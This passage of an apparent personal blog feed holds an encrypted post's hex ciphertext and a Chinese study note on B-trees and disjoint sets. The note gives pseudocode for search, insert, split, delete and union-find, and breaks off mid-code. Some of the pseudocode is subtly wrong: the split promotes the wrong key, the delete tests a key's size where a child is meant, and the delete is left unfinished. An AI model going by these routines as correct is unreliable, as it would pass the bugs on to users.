bf4eebb6188a97c7f33bf46928d93eb5d0151584ce25a16150120acce8f2527b5328407cf146a786a89d1a9fe32968ed5a724966312313fdd897715d8e1031b5369c4bc8884c627868275a26383f66b9a2fc51e4e3ccf9bfb144c0eba1762f32418c147c7594f39326040b3ad46726d673ba62308574b983fcb07d09b2c8f9d6af09605b22f8090f97aa1dd0a613b3cc897a2a8e8b5c19896df18926963edf806fcd86904114d2ae9d90f8aca5e6ea98da2f2ff3a718026d82706fa3681c2f6ff4e1d5c7ca3142fbc6de5ac5e4852dbefeeb3f4abb6902a0bcb27c1e6fbc60a5fd3cb647b6b95ca7928afa0b4acb1992bb4904958461f8df33dc3f3d435a8b55e3f546e1e4800895b8b99e5a31a9500af39f432899420aafd106069786116ff749fab64e36308b9fc2f78a1adc2c5beeb8fbd8341fb21ca1c662aff8e6774515a9fe313f75447a90a5314fbfdb46270fc1cc42d647088153fe5ddd23527630c830c94be7963cedcf31b2748248249241884a706be71a5c95e5ace0199c79f61246c9fcd5e78d184a6df18bad9e61e1fa53cad216e5736416f1b6e3297fbc91d3ef537cb2745fe432932ca20546496f1846b675fc0827795d9b784d89e10d7b0f34311ae788c553cd750f10f5f8f30e1488de02d9d054574d8ca8b4a3a73595866ef7fd320e4328b4f55c6085536be84e0dfa6ee650d14a9ee66bb53fda8c55777be6a90a7753079a37d401f45870f765aefdb7c3b163f5754279d4addff14853d11743108bd55bf8338183285a49dcc2e9f5a8eb16e62d8e4d56d9bdcbb12fbfaeadaccebf6fb2e9f828dffe2a39e095ec2f3b17d7f8bc5a3318e81afc34e50e1f244296a6d7ca3040be2c4b1cb8456a65bd5b19680827c6e5bced15a6f8284242771168d38c225812af2b6e0916a4731c89dd6d1e9b3fea544e2ac89ab8837be3f487bd166fbe432865f6c605b7363db4228e4f75b1d0285894a5ae83a4e1c7edb959806d15c19396d44715bbc30e403940f17ec624a1336c10c9cc18c8b84a97bc125a48552c83afd3e8f50d92417d0efdb14d3a7c6eeb9f730d48232844dfaad9ff5948e43a796474026048f0293c78ecf0a96ec96263553964e3feeb29f29ca35a2df3306da6a3c2c014f4caf4c8d98c0b0d6f0fe4f828249a3a3e34d597c272c317c70e7c71a26e3ae8719a7b8920e1b344d570c3776b771b2fd397ad4c3f672c1a5d0afceb16146a518f2d613704de9c274c4b5c370c3df8d0df2f95fea036d362279b04f1c2736611120b6e8422844838bae921fb4dcda0ef84db63a71aea22f54070aa6541610f7aec86987a89e5937ae4f8fedfe974cd14e5fbb64f9c20493cee31d73c1f3b12487f71c6c11ff1c22278e40c5261443234d7e79f4872593954571155fcd0ad0729a1417c12cd5275ade63769522dfd107405ad916ea30781b93f3f781c708eb0a567db1f9f62b2e8b37ab808a0d1aef5db87babd26d019b1639c97cb3e6569e7bb4439335bd386f1bf1627f7c57ee708aab466d8d9eee51a9aa4ef76e9314eb6205262d062453b197a9fe0b4d63802b564ef3b21dcdeaefb7950b1b7c3479929aad3a5ee32c404a8e270990b47819fa8d79a1bbb65ae1636d78ef0a1167023df0d83011a761568d9f2a2451e4a65debed1ae44863482474581e0cb23107d7072d7932f7bb9a13bb45bed7b92858113d27c67faa774403eb9c987807757b6cdc6b27f1833e9ab5bb064851ba8ea99a943af9ef732b151fd5905bebadb8a6ffb730dcbaba019110b5bbb679f1e27a9d96c6bef47c0fb4f36c1df2387ac421934142cfe8d0f65ae3fd6c96b9637809baf47b5e42a97c869025efb897ce419227b36fcd5890402ca7d09565a2e8f584a4ab980200ef37c4e55968bd95bc69e79fcae24ccdb82a81c172d1eeb3a976986778975f05f0155b26f4e183c2abf44ddb8c434fc92b17b7dd577d4b6705be78dd3b8f0aa963859a33049a56b3c2f9e955d86b5fba273084d493d085f92f294268db53a27023e303cf226083d7bed02afef09f63cc386b276b58d8723479769bd29df8270d4929238a552812e3e9b10d92fe9fd1644e9c0f9eed35fb623c9086a8a601273b176093ad79e82bde02936be737bcf0c3fa3a19a83423c777acef4b8f5254d4a358884dd12282ca63dd14b7e0c2f504cfa0d966878d7df3c8c9aa231c67111cff5d7b58b2952a56b3514aacaa51dc6934cf333bbe1b3b9ba6a54fb340e3a16f964fb3a5ec312d84f29853ea8593ba3828c88d9b544dbe9132592a0c6a28f941f65666c499e85509651b73f7cca85872e7e6f2d9539fab111c939f63025a240c4886d2e240d812f8dd49e8f38d365a30097bb66029a02b5734b084ff89c55bc9c82361d2ed7c01be54e768f225e7b7034065340628ae0e4c03799bbddc2c690461aa41d87a0c6e9bd6052a3a817aa7d304fa6027869293b1d7cd24d00c1ffec7821abe3cef2e5532a8e47b66c749f00e443348bc44a375c9004b1ff3d6057d6c474e480cdaa15fc47d27beb96fcd95a10d563cc20076b0c129879925e6df8e61543ebd9d33cfdd6d6406b58d39dd585d7d2ae9c88818822cffb5fc3b7ad1c5603adf47ce7d3f1d98e360899f75a621d66e426503dfed9fb6f1efc67fbfd72b184fb169ae08c020fb65147bb776d464fd8bfdc5bd5ac231f7580247df3784b358202ca0f842a71bfcebbb4f84719c3c4ef11aa771bda1458ed5cd450b3c2dfcbbc2b83f52496f19ef4799c05861bd9b86565d7a255bb29218be42559f3af0d6f2e3546688350cda6dc0b4e527fd9bd3475feb4c3003ba4b3f37a3f104dff7e33c523fac1a73e2c8645cb08c73d7ea32900c1346e802296a757f8cd508fa1a6446e7cd94d0ae9b52ea78ed2dc2177c753b3ea52c64fa57799dad50843bc4a876db57bf38f4c9ebce59a446c9d086d736243f88a96f10e63a809119a92926fc617f47f0a70cd5d61371f1616b5e1450e4e4d513feb5f5f9959e1e474f6289d575771aaeff868fc4324b675627dd37be404dd9b82fb9a4175fe23d57ba388fefecee807d9648f28c7d3e69e4db2b871e1359a429b703abc83ee41c3780717424b6155feb43fca21e4c9e0ce3cb056fcb4bd792ab10efeac55d15679f3bb479e43a18f3169378d670a2c57235c5a0643b41dc61d0283ba62f81ea82c29f68696b13b4bda48a6d4b14691033134bdcfcae5570393c8175b1448f3b5c69639898b885fea9053526b1a7caee01e66145480fa1014e206157d6a427ff2cd4c5981cf265c1d933d04d879d1254cc7dbb092a5496d1fc90463d2dc2343af58c90a7e1b545f9926f044cf7a89dfa0c5190eea82bbecb4b8db59f3942507a5d298263d16fdb4f98b413f14fedb9ad2eff3365213e3f5403229d0cb989379fbe5101473b7fae33fbcf864ac6b8ed4bf13bf10512f91402634ac674ef2b35e089d5936288ca76c93073e3b34a9785f0f190e2d26a5441ecfee341713a017a64356f72464a7d8bb208b1f38934c1bd94d6fc1666569d3d3c4903dda25f891123b584df39e0530813dc6c0b7dd277d56ff09a0ce64c0c0f84232c80405a6d9fa38c55024b38823dc8ec29805c842f238d04b555ca62635bf4cf615fd0d060cede0930567f39e69ca9d1815a7c0672c9c3e67b88b103e8792f01440ab417743cb22d0b5e1fbbe6abe262d3b8be231c3b450f0c3119eda3ec5684754d036a25afa6fbfdf1321dd90b7b06c37366cc8010ba6a1099d30c0dc6173151486df2f4df97d8919607485caef3286423623534b41335613a7383d7e1fa29112bbfcfd738fbba5856f65ba298fc2b328616c83a8157952ed2484ca6b8145b5acbb68a3a70219985f087151f6576dc90e6648553075a79231238b2dad097a45fab8b1e707dedf03f5488e5afa0159b9e23235e6f24442a97efc51480b21b9fb932b1ff9b7fb7e9412868694443b562581a08c68d67e51c7899c038f0829f62dd0fe05ac41549db9f032349dd495c0fb79f269447a046e362a147ae0f6e3ef9d37e59ea10a61203c93b43faa6147221c69166c9f4521ac3eda9714498bc0d942f84cc1d5019b9458c7237a2afdf573005da7c724b50e6b0ae15a0fa77b1b8443cd6b3d4fcfb5886fee8b4cf8b7537f00f134ac52c854065ee43717721cbfb3611118700f1bad7691f74779a8a1eb65b8e9fb7fd4c7364d7b26a47cbe709484c7e9211ab6581e12045ab10738b3eddff947ae5972a35dcbdcdc734faf1c113b19c0094a48805976dd71bd05026ec990204e7a6c0b6af20d61a2856d6683996dcc88cd9bf58a18f265c63261d5505564e1477413f317150fd181704925a2d109f9ddea30dceb7c134a097c5c3b043e1eed48e6fc9ee8eb89a37fd4512ae1795c833920c5e3c33b26424e7787880057c658830450276682ef676515a858d0709149d5f83951e2f785cf8e9516b404d939954defbce4c755301ec165db43b241fed371c6cbc22df925e23cebdaaaa400bf4b2588508f76f207e7315bcff68b3188b7a23e31cdf06d6d78588b3f25265caa959129436b911fde91b5efd6c7c3bf0c708e0eedd49b3a451ef9a24b577a6752f1c72d4052f192c0cc65211015604fbcb76df1b76cb7032974645827a267782e7b19aa02d3101e81f28a77adf7af4dd7d4c01e60a16029e24f507e185a89e846baf0d022b9558868bf6dc49a0a73219dcc7444d3264aabdd4654dcfddd9be553307e301972a2db754b3b8df80cbc99025e8efa99cf7a892465461aa9f7d35c00d6bf1806c66b0ef9a06deeff6c840fb51c462e67d424970d84e1b96b731556f9489227eb333f9ff949d34a33efcb003d6172617a4e9bfbb4f5f271ac4494425a87151d4b3ccfb172b0b696599ebe1c72ebcbfaea1878de35fa03f814d4de3b285d408117cb7e0f0202894957e55619c48d411ce1cef2af04485274596c0b1099e01ba1d78642443f587ac9afb4a3726bd395add669d8421b2bc22c1ad4901e5b779e577cc3a477c4351837ac3f6fda1cdd2fc4b33cb7f35d0f4e4261634d3c9d6d511cf3b43f130160989488e6c86b7ac5e290a9cb47a758bff56aa796230f98013c91054e0acb9beff5f9fae8692a5c680388b4cf6f3fd64190d4b52af4980d94dfb79f7fb8edf560454ac3997124f21454bf52f778d0551aafce4f7c2f1292922e0c10202f8040efe48c33f1a4371488e8ae4c9b9f4e0441779bec8ac1524951f6466aa9e05c7191e1bafebe07b2776a7f3183eed7d6d26fbdca3e38fd7ac1fa57814bc3c5891c180a5f753c91b3e58d75072bfa8bcb0e1464d9bb1b02768128590c24895852623bdf1309ffbd0f5f7b8ceaedf879d260f3c299b44c614dd48928f3d43a4d20a6655df62fe3235b4b47645609e41a0a32c7121149c7dd789b9f7c481b55cd28714a1e3237c77b47a2e1a6254d54f30d6fa19ac658892a743f841818565897696dc0cb5660dca7d616b4981094c7e1add3667698defbddd2e8c002c61153014578315cf6533b3737d98efcfdaf478471e91de064d8e82d2d97083e0bb67a94b34ae58380d8c84ccbd9f48a0d25035342919264b9dd4b1848df57190ef2e003b1ccb326ba8df313400050cced5fc08bb7f0a4ecf67dd05317aa725c016b7c9bcaa0cf02482ce4d4529057f68726885915c4a33344a5931c7ee94f8c120d972989c6cc04e8ba2b2968fe2b40d2f0bb23d1f470a17a2b2c4c7cf2a514a5d6ff567cfc25a1d0c121ecbd0a09ddfccc50070074ce6a457fc8a9f2427fed1f7a89cc057b835159621f9fd98ae7a4d12406405c62bb01fc20a8e5159307b43c39cc09fdb8267161263d24d298eb158b1aa06eaa2130f9aac22d5d2a40247f484a9f07036c21c00715f29249f341325bc8062cd529c6e41cfbc98816c83d1da1a8b3a503d8117f18f2cb566d71461bf3887d62332cc0671e295225338fb9b78f9b55155812c77f48e2f31f1c64af2ad501f00bbd78be061887626e2c08fe057bac290273e3c31ef6ed304f9845778f21ffd8cfc6994fa23cb8240fbeefecf53953b85da0e5050de7d766bc69cf87c04076951e2303ecee690bf592ff5b97429b045063ceb332c90f2b8feb77cb9b8e245043b4fe3d7ae4a2237af762d0b9d6008421302e4a22cbadaea14d4bc06762246377732da71c40cc5ccddb5b1c1916e7303334d69d9a1b8534e31e2197124548d5b24b87d13afab54d5a60caf575fc81f1ce7e58a7e7a9b5dff5847e20d327f1110dcb250e061ebd437cbaa3f4b4921d07e491261ddf6b8257ff526a360edb16886f790a615df57ab7d705ec770f33ee1a708d86d350d733f4cdf244f0f9c217e19c91be8e74b0702cec0789b692f3cb2d16396465d92796d447150df482df8d2afe374bc669863b4df30f13840bdbaa8f99c4016d1dc5f88c517d4617f17c3b12113aa4b907da18b2896446d4f0ed9850006baf4beed3523109182010662ac6190fc47d52fbc6d0f1e46fd9593812612a377442dba59e35a76c5fe6253984e0121b8fca04d9ee7916124e6df21ecd7f791086948f23efdd58fb1e2d12c61588cfb64cc58dd15c061308f6f0118805c3726dab6732c3e4ffc9375687b9cc8dff61913e0260a45175e281525bacf6e6c5951580f270f26d35811cf9b340860659feeafe333db2730f91576f77ff1822cb674e96f042f44972614b46833dfe6b0b3809766a83dd2805f425bcfe1e26ba0ea5fcc8271f377a0c16e3296ba1ad089a35da53a3dd0bbf4f3d545fa74549f7cd3da3b7dc7b0e7c6007c3da126dbcca67b8df82c9eacd414e0892bb252151c6655642a5419e9b16cf49862b124eef95cee2feb562146350c0f14d0a41199904e76555d218497169e289b6a5ceaa2032cf90072138afe31e6baf20218d6d6b7e306e66bc0986b10f6d8fe8c94e9f8a34961e824f566db1f5855770cef212761f076620410ecf5a01a6056235e3ea6cb27fa7d4d533666</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> summary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Data Structure Note(VI) —— Advance-Data-Structure</title>
      <link href="/2019/10/22/advance-data-structure/"/>
      <url>/2019/10/22/advance-data-structure/</url>
      
        <content type="html"><![CDATA[<h2 id="Prologue"><a href="#Prologue" class="headerlink" title="Prologue"></a>Prologue</h2><p>　　这是数据结构大杂烩系列的第六篇文章。在这篇文章中，我们将一起学习算法导论中高级数据结构的部分，内容主要是书中部分知识的整理和记录。</p><h2 id="B-Tree"><a href="#B-Tree" class="headerlink" title="B-Tree"></a>B-Tree</h2><h3 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h3><p>　　B树是为磁盘或其他直接存取的辅助存储设备而设计的一种平衡搜索树。B树是具有以下性质的有根树:</p><ol><li>每个结点有以下属性<ol><li>x.n，表示当前结点中的关键字个数</li><li>x.n个关键字本身\(x.key_1,x.key_2,…,x.key_{x.n}\)，以非降序存放</li><li>x.leaf 一个布尔值，表示x是否为叶结点</li></ol></li><li>每个内部结点还包含x.n+1个指向其孩子的指针\(x.c_1,x.c_2,…,x.c_{x.n+1}\)。叶子结点没有孩子</li><li>关键字\(x.key_i\)对存取在各子树中的关键字进行分割，由于有x.n个key，我们可以得到x.n+1个区间，即x.n+1个孩子。另\(x.c_i\)表示第i个孩子，\(k_i\)表示这个以这个孩子为根的结点的子树，则:\(k_1&lt;=x.key_1&lt;=k_2&lt;=x.key_2&lt;=…&lt;=x.key_{x.n}&lt;=k_{x.n+1}\)</li><li>每个叶结点具有相同的深度，即树高h</li><li>每个节点所包含的关键字个数具有上界和下界。用一个被成为B树最小度数的固定整数t(t&gt;=2)来表示。<ol><li>除了根节点外，每个结点至少有t-1个关键字。即除了叶子结点外的内部结点都至少有t个孩子。</li><li>每个结点至多可包含2t-1个关键字。即，一个内部结点至多有2t个孩子。当一个结点恰好有2t个孩子时，我们称该结点是满的</li></ol></li></ol><p>　　另外，B+树是指将所有卫星数据都存储在叶结点中的树，内部结点只需存放关键字和指向孩子的指针。</p><h3 id="Search-amp-Create"><a href="#Search-amp-Create" class="headerlink" title="Search &amp; Create"></a>Search &amp; Create</h3><p>　　B树的搜索基本上和BST一样，区别仅仅在于B树的搜索不是两个分支，而是x.n+1个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">B-TREE-SEARCH(x, k):</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= x.n <span class="keyword">and</span> k &gt; x.key[i]</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> i &lt;= x.n <span class="keyword">and</span> k == x.key[i]</span><br><span class="line">    <span class="keyword">return</span> (x,i)</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> x.leaf</span><br><span class="line">    <span class="keyword">return</span> NIL</span><br><span class="line"><span class="keyword">else</span> DISK-READ(x.c[i])</span><br><span class="line">    <span class="keyword">return</span> B-TREE-SEARCH(x.c[i], k)</span><br></pre></td></tr></table></figure><p>　　树高为\(O(log_tn)\)，故搜索耗时为\(O(tlog_tn)\)。另外，这里事实上是可以做一点小优化的。如果B树的最小度数t比较大的话，我们可以采用二分查找的方式，进一步降低复杂度，耗时变为\(O(logn)\)<br>　　为了构造一棵B树，我们需要先定义一个辅助函数ALLOCATE-NODE，它负责分配一个新的结点。接下来我们可以创建一棵空的B树。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">B-TREE-CREATE(T):</span><br><span class="line">x = ALLOCATE-NODE()</span><br><span class="line">x.leaf = TRUE</span><br><span class="line">x.n = <span class="number">0</span></span><br><span class="line">DISK-WRITE(x)</span><br><span class="line">T.root = x</span><br></pre></td></tr></table></figure><h3 id="Insert"><a href="#Insert" class="headerlink" title="Insert"></a>Insert</h3><p>　　B树中插入一个关键字还是比较复杂的，因为我们需要保证B树除根结点外的内部结点的度数在一定范围内。插入过程中，由于结点为满时，我们不能再插入。因此，我们需要一个分裂操作，将已满结点(2t-1个关键字)分裂为两个各含t-1个关键字的结点，中间的关键字被提到父亲结点，以产生一个新的孩子指针。(这里比较复杂，建议结合图片理解)<br>　　在插入的过程中，我们沿着树向下查询，如果子树的关键字已满，则对其进行分裂。这样我们就能保证在插入的时候不会出现往已满结点插入关键字的情况。<br>　　分裂如下:<br><img src="/2019/10/22/advance-data-structure/split.png" alt="split"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// y=x.c[i]为已满的结点，即y具有2t-1个关键字</span></span><br><span class="line">B-TREE-SPLIT-CHILD(x, i)</span><br><span class="line"><span class="comment">// 新开辟一个结点z</span></span><br><span class="line">z = ALLOCATE-NODE</span><br><span class="line">y = x.c[i]</span><br><span class="line">z.leaf = y.leaf</span><br><span class="line">z.n = t<span class="number">-1</span></span><br><span class="line"><span class="comment">// 复制y的右边t-1个关键字到z中</span></span><br><span class="line"><span class="keyword">for</span> j=<span class="number">1</span> to t<span class="number">-1</span></span><br><span class="line">    z.key[j] = y.key[j+t]</span><br><span class="line"><span class="comment">// y是非叶子结点的话，孩子指针也要复制</span></span><br><span class="line"><span class="keyword">if</span> y.leaf == <span class="literal">false</span></span><br><span class="line">    <span class="keyword">for</span> j = <span class="number">1</span> to t</span><br><span class="line">        z.c[j] = y.c[j+t]</span><br><span class="line">y.n = t<span class="number">-1</span></span><br><span class="line"><span class="comment">// 移动x右边的关键字，空出一个位置留给将被提上来的关键字</span></span><br><span class="line"><span class="keyword">for</span> j = x.n+<span class="number">1</span> down to i+<span class="number">1</span></span><br><span class="line">    x.c[j+<span class="number">1</span>] = x.c[j]</span><br><span class="line">x.c[i+<span class="number">1</span>] = z</span><br><span class="line"><span class="keyword">for</span> j = x.n downto i</span><br><span class="line">    x.key[j+<span class="number">1</span>] = x.key[j]</span><br><span class="line">x.key[i] = y.key[i]</span><br><span class="line">x.n = x.n +<span class="number">1</span></span><br><span class="line">DISK-WRITE(y,z,x)</span><br></pre></td></tr></table></figure><p>　　有了分裂的操作，插入操作就容易了很多。我们只需要保证树根不满即可。后面遇到已满的结点时，只需对该结点进行split操作，然后再进行访问即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">B-TREE-INSERT(T,k):</span><br><span class="line">r = T.root</span><br><span class="line"><span class="keyword">if</span> r.n == <span class="number">2</span>t<span class="number">-1</span></span><br><span class="line">    s = ALLOCATE-NODE()</span><br><span class="line">    T.root = s</span><br><span class="line">    s.leaf = FALSE</span><br><span class="line">    s.n = <span class="number">0</span></span><br><span class="line">    s.c[<span class="number">1</span>] = r</span><br><span class="line">    B-TREE-SPLIT-CHILD(s,<span class="number">1</span>)</span><br><span class="line">    B-TREE-INSERT-NONFULL(s,k)</span><br><span class="line"><span class="keyword">else</span> B-TREE-INSERT-NONFULL(r,k)</span><br></pre></td></tr></table></figure><p><img src="/2019/10/22/advance-data-structure/split.png" alt="split"></p><p>　　接下来，插入的时候保证非满。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">B-TREE-INSERT-NONFULL(x,k):</span><br><span class="line">i = x.n</span><br><span class="line"><span class="comment">// 叶子结点时，直接找到对应位置插入即可</span></span><br><span class="line"><span class="keyword">if</span> x.leaf</span><br><span class="line">    <span class="keyword">while</span> i &gt;= <span class="number">1</span> <span class="keyword">and</span> k &lt; x.key[i]</span><br><span class="line">        x.key[i+<span class="number">1</span>] = x.key[i]</span><br><span class="line">        i = i<span class="number">-1</span></span><br><span class="line">    x.key[i+<span class="number">1</span>] = k</span><br><span class="line">    x.n = x.n+<span class="number">1</span></span><br><span class="line">    DISK-WRITE(x)</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">while</span> i &gt;= <span class="number">1</span> <span class="keyword">and</span> k &lt; x.key[i]</span><br><span class="line">        i = i<span class="number">-1</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    DISK-READ(x.c[i])</span><br><span class="line">    <span class="comment">// 如果已满，需要分裂，注意到分裂后i可能需要+1</span></span><br><span class="line">    <span class="keyword">if</span> (x.c[i].n) == <span class="number">2</span>t<span class="number">-1</span></span><br><span class="line">        B-TREE-SPLIT-CHILD(x,i)</span><br><span class="line">        <span class="keyword">if</span> k &gt; x.key[i]</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">    B-TREE-INSERT-NONFULL(x.c[i],k)</span><br></pre></td></tr></table></figure><h3 id="Remove"><a href="#Remove" class="headerlink" title="Remove"></a>Remove</h3><p>　　删除操作本身还是要比插入要难一些。我们删除时，会发生两个问题。一是删除关键字后，当前结点的孩子数量就要减少，如果当前结点不是叶子结点的话会出问题，解决方案是类似BST，我们寻找一个前驱或者后继来替代当前结点。二是删除结点后，有可能导致当前结点的关键字数量小于t-1，从而破坏了B树的性质，因此，我们需要在一定的条件下对B树的结点进行一些合并的操作。<br>　　在实现删除操作时，我们加强了一下条件，保证当前结点x的关键字数量至少为t。在删除过程中，分以下几种情况讨论:</p><ol><li>如果关键字k在结点x中，并且x是叶结点，直接从x中删除k</li><li>如果关键字k在结点x中，并且x是内部结点，则做以下操作:<ol><li>如果结点x中在k前面的子结点至少包含t个关键字，则找出k在以y为根的子树中的前驱k’。递归地删除k’，并在x中用k’代替k。</li><li>对称地，如果y少于t个关键字，则检查关键字k后面的子结点z。如果z至少有t个关键字，则找出k在以z为根的子树中的后继k’。递归地删除k’，并用k’替代k</li><li>否则，y和z都只有t-1个关键字，将k和z全部合并进y，这样x失去了一个关键字和一个孩子，并且y现在包含2t-1个结点，递归地从y中删除k</li></ol></li><li>如果关键字k不再当前内部结点中，则确定可能包含k的子树的根x.c[i]。如果x.c[i]只有t-1个关键字，执行以下两个步骤来保证x.c[i]包含t个关键字<ol><li>如果x.c[i]只有t-1个关键字，但相邻的一个兄弟节点至少包含t个关键字，则将x中某一个结点降至x.c[i]中，并将x.c[i]的相邻兄弟的一个关键字升到x，并将相应的孩子指针移到x.c[i]中。</li><li>如果x.c[i]以及相邻的兄弟都只包含t-1个关键字，则将x.c[i]与一个兄弟合并。</li></ol></li></ol><p>　　尽管这个操作有些复杂，逻辑还是比较清晰的，且复杂度依然为O(h)。伪代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">B-TREE-REMOVE(x, k):</span><br><span class="line"><span class="keyword">if</span> k in x.key</span><br><span class="line">    <span class="comment">// 情况1</span></span><br><span class="line">    <span class="keyword">if</span> x.leaf == True</span><br><span class="line">        remove k in x.key</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        index = x.key.indexOf(k)</span><br><span class="line">        <span class="comment">// 情况2.1</span></span><br><span class="line">        <span class="keyword">if</span> x.c[index].size &gt;= t</span><br><span class="line">            k' = find-max(x.c[index])</span><br><span class="line">            x.key[index] = k'</span><br><span class="line">            B-TREE-REMOVE(x.c[index],k')</span><br><span class="line">        <span class="comment">// 情况2.2</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> x.key[index+<span class="number">1</span>].size &gt;= t</span><br><span class="line">            k' = find-min(x.c[index+<span class="number">1</span>])</span><br><span class="line">            x.key[index] = k'</span><br><span class="line">            B-TREE-REMOVE(x.c[index+<span class="number">1</span>],k')</span><br><span class="line">        <span class="comment">// 情况2.3</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            MERGE(x.c[index], k, x.c[index+<span class="number">1</span>])</span><br><span class="line"><span class="comment">// 情况3</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    find x.c[i] that may contain k</span><br><span class="line">    <span class="keyword">if</span> x.c[i].size &gt;= t</span><br><span class="line">        B-TREE-REMOVE(x.c[i],k)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><h2 id="Disjoint-set"><a href="#Disjoint-set" class="headerlink" title="Disjoint-set"></a>Disjoint-set</h2><p>　　在实际编程中，我们往往需要实现这样一类需求: 给定两个元素，判断它们是否位于同一个集合。这种时候，我们就需要用到不相交集合的数据结构，它维护了一个不相交的动态集的集合，\(\delta = {S_1, S_2, S_3,…,S_k}\)，每个集合\(S_i\)对应有一个代表，它是这个集合中的任意一个元素。这种数据结构支持以下功能:<br>　　MAKE-SET(x): 创建一个新的集合。由于只有一个元素 x，x 是集合的代表<br>　　UNION(x,y): 将包含x和y的两个动态集合合并为一个新的集合 S。并且，我们需要在\(\delta\)中将包含 x 和 y 的两个动态集合删掉，并加入合并后的新集合 S<br>　　FIND-SET(x): 返回 x 所在的动态集合的代表<br>　　在OI中，我们经常用到的并查集就是这样的一种数据结构。</p><h3 id="Minimal-Spanning-Tree"><a href="#Minimal-Spanning-Tree" class="headerlink" title="Minimal Spanning Tree"></a>Minimal Spanning Tree</h3><p> 　　前面的定义也许有点难理解，我们还是来看并查集的一个重要应用——最小生成树吧。我们在贪心算法的章节中知道，Kruskal 算法实现过程中，需要查询当前选择的两条边是否位于同一颗树中。我们使用 fa[x] 数组表示当前元素的父亲，当 x 的父亲是自己时，说明 x 为树根，即所在集合的代表。以下是实现的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fa[N];</span><br><span class="line"><span class="comment">// n为元素的个数</span></span><br><span class="line">MAKE-SET(n):</span><br><span class="line">    <span class="comment">// 选取每个元素自身作为代表</span></span><br><span class="line">    <span class="keyword">for</span> i from <span class="number">1</span> to n</span><br><span class="line">        fa[i] = i;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找x所在集合的代表</span></span><br><span class="line">FIND-SET(x):</span><br><span class="line">    <span class="keyword">if</span> x == fa[x] <span class="keyword">return</span> x</span><br><span class="line">    <span class="comment">// 这是一个路径压缩的过程，建议尝试画图理解</span></span><br><span class="line">    <span class="keyword">return</span> fa[x] = find(fa[x])</span><br><span class="line"></span><br><span class="line">UNION(x, y):</span><br><span class="line">    <span class="comment">// 获取两棵树的树根，如果不相同，则将他们连接在一起。</span></span><br><span class="line">    <span class="comment">// 